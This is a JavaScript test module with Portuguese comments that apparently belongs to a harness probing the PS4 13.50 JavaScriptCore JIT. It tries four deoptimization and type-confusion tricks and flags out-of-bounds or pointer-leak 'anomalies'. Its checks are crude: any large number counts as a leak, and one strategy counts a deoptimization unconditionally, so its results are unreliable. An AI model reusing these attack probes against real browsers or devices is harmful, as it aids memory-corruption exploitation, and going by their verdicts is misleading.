/**
 * TEST: JIT Deoptimization Attack
 * Força o JIT a desotimizar em momentos críticos para criar brechas
 * PS4 13.50: JSC JIT compiler
 */

export const testJitDeoptimizationAttack = {
    id: 'JIT_DEOPT_ATTACK',
    name: '⚡ JIT Deoptimization Attack',
    risk: 'CRITICAL',
    category: 'JIT',
    description: 'Força desotimização do JIT para criar type confusion entre código otimizado/não-otimizado',
    ps4Compatible: true,

    setup: function() {
        this.jitState = 'unknown';
        this.deoptEvents = 0;
        this.typeMismatches = 0;
        this.oobDetected = false;
        
        // Arrays para confundir JIT
        this.jitArrays = [];
        for (let i = 0; i < 50; i++) {
            const arr = new Float64Array(16);
            arr.fill(i * 1.5);
            this.jitArrays.push(arr);
        }
    },

    probe: [
        function(scenario) {
            return scenario.oobDetected ? 1 : 0;
        },
        function(scenario) {
            return scenario.deoptEvents;
        },
        function(scenario) {
            return scenario.typeMismatches;
        }
    ],

    trigger: function() {
        this.deoptEvents = 0;
        this.typeMismatches = 0;
        this.oobDetected = false;
        
        // ==========================================
        // ESTRATÉGIA 1: Hot loop → mudar tipo → desotimizar
        // ==========================================
        
        // FASE 1: Aquece o JIT com um tipo consistente
        const hotArray = new Float64Array(16);
        for (let i = 0; i < 16; i++) {
            hotArray[i] = i * 1.5;
        }
        
        // Função que será otimizada
        const hotFunction = function(arr, idx) {
            return arr[idx] + 1.5;
        };
        
        // Aquece com Float64Array (tipo consistente)
        for (let i = 0; i < 1000; i++) {
            hotFunction(hotArray, i % 16);
        }
        
        this.jitState = 'WARM';
        
        // FASE 2: Força desotimização mudando o tipo
        try {
            // Muda o tipo do array de Float64 para Uint32
            const corruptedView = new Uint32Array(hotArray.buffer);
            
            // Tenta chamar a função otimizada com o array "corrompido"
            const result = hotFunction(corruptedView, 0);
            
            // Se a função esperava Float64 mas recebeu Uint32...
            if (typeof result === 'number' && !isNaN(result)) {
                this.deoptEvents++;
                
                // Verifica se o valor parece um ponteiro vazado
                if (Math.abs(result) > 1000000) {
                    this.oobDetected = true;
                }
            }
        } catch (e) {
            this.deoptEvents++;
        }
        
        // ==========================================
        // ESTRATÉGIA 2: Polimorfismo extremo
        // ==========================================
        
        // Cria função que aceita múltiplos tipos
        const polyFunc = function(a, b) {
            return a.x + b.y;
        };
        
        // Aquece com objetos normais
        const obj1 = { x: 1.1, y: 2.2 };
        const obj2 = { x: 3.3, y: 4.4 };
        
        for (let i = 0; i < 500; i++) {
            polyFunc(obj1, obj2);
        }
        
        // Agora passa um TypedArray (deveria desotimizar)
        const typedAsObj = new Float64Array(4);
        typedAsObj[0] = 1.1;
        typedAsObj[1] = 2.2;
        
        // Adiciona propriedades como se fosse objeto
        typedAsObj.x = 5.5;
        typedAsObj.y = 6.6;
        
        try {
            const polyResult = polyFunc(typedAsObj, obj1);
            if (typeof polyResult === 'number') {
                this.typeMismatches++;
            }
        } catch (e) {
            this.deoptEvents++;
        }
        
        // ==========================================
        // ESTRATÉGIA 3: Bailout do JIT via side effects
        // ==========================================
        
        let sideEffectFlag = false;
        
        const funcWithSideEffect = function(arr) {
            let sum = 0;
            for (let i = 0; i < arr.length; i++) {
                sum += arr[i];
                // Side effect no meio do loop
                if (i === 8) {
                    sideEffectFlag = true;
                    // Modifica o array durante iteração
                    try {
                        Object.defineProperty(arr, 'length', { value: 1000 });
                    } catch(e) {}
                }
            }
            return sum;
        };
        
        // Aquece sem side effect
        const cleanArray = new Float64Array(16);
        cleanArray.fill(1.0);
        for (let i = 0; i < 500; i++) {
            funcWithSideEffect(cleanArray);
            sideEffectFlag = false;
        }
        
        // Agora o JIT está otimizado assumindo que length não muda
        const trapArray = new Float64Array(16);
        trapArray.fill(1.0);
        
        try {
            const trapResult = funcWithSideEffect(trapArray);
            if (sideEffectFlag && trapArray.length === 1000) {
                this.deoptEvents++;
                // JIT pode ter lido além do array original
                this.oobDetected = true;
            }
        } catch (e) {
            this.deoptEvents++;
        }
        
        // ==========================================
        // ESTRATÉGIA 4: OSR (On-Stack Replacement) attack
        // ==========================================
        
        const osrArray = new Uint32Array(16);
        osrArray.fill(0xAAAAAAAA);
        
        // Função com loop longo (candidata a OSR)
        const osrFunc = function(arr) {
            let result = 0;
            // Loop grande o suficiente para trigger OSR
            for (let i = 0; i < 10000; i++) {
                if (i < arr.length) {
                    result += arr[i];
                } else if (i % 1000 === 0) {
                    // Ponto de bailout potencial
                    try { arr[i] = 0; } catch(e) { break; }
                }
            }
            return result;
        };
        
        try {
            const osrResult = osrFunc(osrArray);
            this.deoptEvents++;
        } catch (e) {
            this.deoptEvents++;
        }
        
        if (typeof gc === 'function') gc();
    },

    cleanup: function() {
        this.jitArrays = null;
    },

    customValidator: function(baseResults, afterResults) {
        if (this.oobDetected) {
            return {
                anomaly: true,
                reason: `💥💥💥 JIT DEOPT OOB: OOB detectado após ${this.deoptEvents} desotimizações e ${this.typeMismatches} type mismatches!`
            };
        }
        
        if (this.deoptEvents > 3) {
            return {
                anomaly: true,
                reason: `⚡ JIT DEOPT: ${this.deoptEvents} desotimizações forçadas! O JIT pode estar vulnerável a bailout attacks.`
            };
        }
        
        if (this.typeMismatches > 0) {
            return {
                anomaly: true,
                reason: `🏆 JIT TYPE MISMATCH: ${this.typeMismatches} type mismatches detectados em código otimizado!`
            };
        }
        
        return { anomaly: false, reason: '' };
    }
};
